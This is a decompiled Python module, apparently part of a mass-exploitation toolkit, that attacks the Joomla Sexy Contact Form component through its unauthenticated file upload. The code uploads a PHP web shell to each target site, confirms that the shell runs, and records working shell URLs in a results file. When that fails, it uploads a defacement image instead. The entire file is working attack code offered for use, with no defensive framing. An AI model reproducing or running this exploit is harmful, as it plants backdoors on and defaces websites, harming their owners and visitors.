# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\Com_SexyContactform.py
import requests
from Exploits import printModule
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
ShellPresta = 'files/up.php'
Jce_Deface_image = 'files/pwn.gif'

def Exploit(site):
    try:
        Check = requests.get('http://' + site + '/components/com_sexycontactform/fileupload/', timeout=10, headers=Headers)
        if Check.status_code == 200:
            IndeX = {'files[]': open(Jce_Deface_image, 'rb')}
            ShellFile = {'files[]': open(ShellPresta, 'rb')}
            requests.post('http://' + site + '/components/com_sexycontactform/fileupload/', files=ShellFile, timeout=10, headers=Headers)
            CheckShell = requests.get('http://' + site + '/components/com_sexycontactform/fileupload/files/up.php', timeout=10, headers=Headers)
            if 'Vuln!!' in str(CheckShell.content):
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(site + '/components/com_sexycontactform/fileupload/files/up.php\n')
                return printModule.returnYes(site, 'N/A', 'Com_SexyContactform', 'Joomla')
            else:
                requests.post('http://' + site + '/components/com_jbcatalog/libraries/jsupload/server/php', files=IndeX, headers=Headers, timeout=10)
                CheckIndex = requests.get('http://' + site + '/components/com_sexycontactform/fileupload/files/' + Jce_Deface_image.split('/')[1], headers=Headers, timeout=10)
                if 'GIF89a' in str(CheckIndex.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/components/com_sexycontactform/fileupload/files/' + Jce_Deface_image.split('/')[1] + '\n')
                    return printModule.returnYes(site, 'N/A', 'Com_SexyContactform', 'Joomla')
                return printModule.returnNo(site, 'N/A', 'Com_SexyContactform', 'Joomla')

        else:
            return printModule.returnNo(site, 'N/A', 'Com_SexyContactform', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_SexyContactform', 'Joomla')